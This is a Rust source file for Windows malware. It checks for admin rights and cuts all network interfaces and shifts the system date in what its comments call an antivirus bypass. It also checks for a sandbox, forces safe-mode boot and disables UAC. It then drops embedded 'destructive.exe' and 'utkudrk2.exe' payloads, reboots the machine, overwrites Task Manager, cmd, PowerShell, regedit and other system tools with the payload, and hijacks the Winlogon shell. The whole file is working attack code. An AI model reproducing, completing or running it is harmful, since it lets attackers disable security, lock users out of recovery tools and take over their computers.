use std::process::{Command, Stdio};
use std::path::{Path};
use std::fs::{File};
use std::io::{self, Write};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
use winreg::RegKey;
use std::fs;

fn disable_uac() -> io::Result<()> {
    // Open the registry key for User Account Control
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let uac_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
        KEY_SET_VALUE
    )?;

    // Set EnableLUA to 0 to disable UAC
    uac_key.set_value("EnableLUA", &0u32)?;

    println!("UAC has been disabled (EnableLUA set to 0).");

    Ok(())
}

fn enable_safe_mode() -> io::Result<()> {
    // Set the system to boot in Safe Mode
    Command::new("bcdedit.exe")
        .arg("/set")
        .arg("{current}")
        .arg("safeboot")
        .arg("minimal")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn disable_network_interfaces() -> Result<(), std::io::Error> {
    // Disable all interfaces
    let output = Command::new("netsh")
        .arg("interface")
        .arg("show")
        .arg("interface")
        .output()?;

    let interfaces = String::from_utf8_lossy(&output.stdout);

    // Loop through interfaces and disable them
    for line in interfaces.lines() {
        if line.contains("Enabled") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(interface_name) = parts.get(3) {
                println!("Disabling interface: {}", interface_name);
                let _ = Command::new("netsh")
                    .arg("interface")
                    .arg("set")
                    .arg("interface")
                    .arg(interface_name)
                    .arg("disable")
                    .output();
            }
        }
    }

    Ok(())
}

fn change_system_date() -> Result<(), String> {
    // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
    let date_command = "date 01-19-2037";

    // Run date command
    let date_output = Command::new("cmd")
        .arg("/C")
        .arg(date_command)
        .stderr(Stdio::inherit())  // Pass error output to console
        .output()
        .map_err(|e| e.to_string())?;

    if !date_output.status.success() {
        return Err(format!("Failed to change date: {}", String::from_utf8_lossy(&date_output.stderr)));
    }

    println!("System date changed to 01-19-2037.");
    Ok(())
}

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let winlogon_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_SET_VALUE,
    )?;

    // Delete existing "Shell" value (if it exists)
    match winlogon_key.delete_value("Shell") {
        Ok(_) => println!("Existing Shell value deleted."),
        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
    }

    // Set new "Shell" value
    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.exe";
    winlogon_key.set_value("Shell", &new_shell_value)?;

    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.exe\".");

    Ok(())
}

fn extract_embedded_exe() -> io::Result<()> {
    // Ensure the target directory exists
    let target_dir = Path::new("C:\\Program Files\\utkudrk2");
    if !target_dir.exists() {
        fs::create_dir_all(target_dir)?;
        println!("Created directory: {}", target_dir.display());
    }

    // Write the embedded destructive.exe to a file
    let destructive_path = target_dir.join("destructive.exe");
    let mut destructive_file = File::create(&destructive_path)?;
    destructive_file.write_all(include_bytes!("../resources/destructive.exe"))?;
    println!("Executable saved to {}.", destructive_path.display());

    // Write the embedded utkudrk2.exe to a file
    let utkudrk2_path = target_dir.join("utkudrk2.exe");
    let mut utkudrk2_file = File::create(&utkudrk2_path)?;
    utkudrk2_file.write_all(include_bytes!("../resources/utkudrk2.exe"))?;
    println!("Executable saved to {}.", utkudrk2_path.display());

    Ok(())
}

fn reboot_system() -> io::Result<()> {
    // Shutdown and reboot the system to Safe Mode
    Command::new("shutdown.exe")
        .arg("-r")
        .arg("-t")
        .arg("7")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn replace_files() -> io::Result<()> {
    let files_to_takeown = [
        r"C:\Windows\System32\Taskmgr.exe",
        r"C:\Windows\System32\perfmon.exe",
        r"C:\Windows\System32\sethc.exe",
        r"C:\Windows\System32\cmd.exe",
        r"C:\Windows\System32\reg.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe",
        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe",
        r"C:\Windows\regedit.exe",
        r"C:\Windows\System32\utilman.exe",
    ];

    // Process files to take ownership and replace them
    for file in files_to_takeown.iter() {
        println!("Processing: {}", file);

        // Take ownership of the file
        let output = Command::new("cmd")
            .args(&["/C", &format!("takeown /f \"{}\"", file)])
            .output()?;

        if output.status.success() {
            println!("Ownership taken for: {}", file);
        } else {
            eprintln!(
                "Failed to take ownership of {}: {:?}",
                file,
                String::from_utf8_lossy(&output.stderr)
            );
            continue;
        }

        // Grant full permissions to the current user
        let output = Command::new("cmd")
            .args(&["/C", &format!("icacls \"{}\" /grant \"%username%\":F", file)])
            .output()?;

        if output.status.success() {
            println!("Permissions granted for: {}", file);
        } else {
            eprintln!(
                "Failed to grant permissions for {}: {:?}",
                file,
                String::from_utf8_lossy(&output.stderr)
            );
            continue;
        }

        // Replace the file with another executable (optional)
        let replacement_file = r"C:\Program Files\utkudrk2\utkudrk2.exe"; // Example executable to replace with
        let output = Command::new("cmd")
            .args(&["/C", &format!("copy \"{}\" \"{}\" /Y", replacement_file, file)])
            .output()?;

        if output.status.success() {
            println!("File replaced: {}", file);
        } else {
            eprintln!(
                "Failed to replace {}: {:?}",
                file,
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    Ok(())
}

fn main() {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        return;
    }

    println!("Admin privileges confirmed.");

    //Define directory path
    let dir_path = Path::new(r"C:\Program Files\utkudrk2");

    // Ensure the directory exists
    if let Err(e) = fs::create_dir_all(dir_path) {
        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
        std::process::exit(1); // Exit the program with a failure status
    }

    // Step 2: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
    if let Err(e) = disable_network_interfaces() {
        eprintln!("Error disabling network interfaces: {}", e);
    }

    if let Err(e) = change_system_date() {
        eprintln!("Error changing system date: {}", e);
    }

    // Step 3: Enable safe mode
    if let Err(e) = enable_safe_mode() {
        eprintln!("Error enabling safe mode: {}", e);
    }

    // Step 4: Disable UAC
    if let Err(e) = disable_uac() {
        eprintln!("Error disabling UAC: {}", e);
    }

    // Step 5: Extract payload
    if let Err(e) = extract_embedded_exe() {
        eprintln!("Error extracting embedded executable: {}", e);
    }

    // Step 7: Reboot the system to Safe Mode if needed
    if let Err(e) = reboot_system() {
        eprintln!("Error rebooting system: {}", e);
    }

    // Step 8: Replace files with utkudrk2.exe
    if let Err(e) = replace_files() {
        eprintln!("Error replacing files: {}", e);
    }

    // Step 9: Modify the registry to set Shell value
    if let Err(e) = modify_registry() {
        eprintln!("Error modifying the registry: {}", e);
    }

}
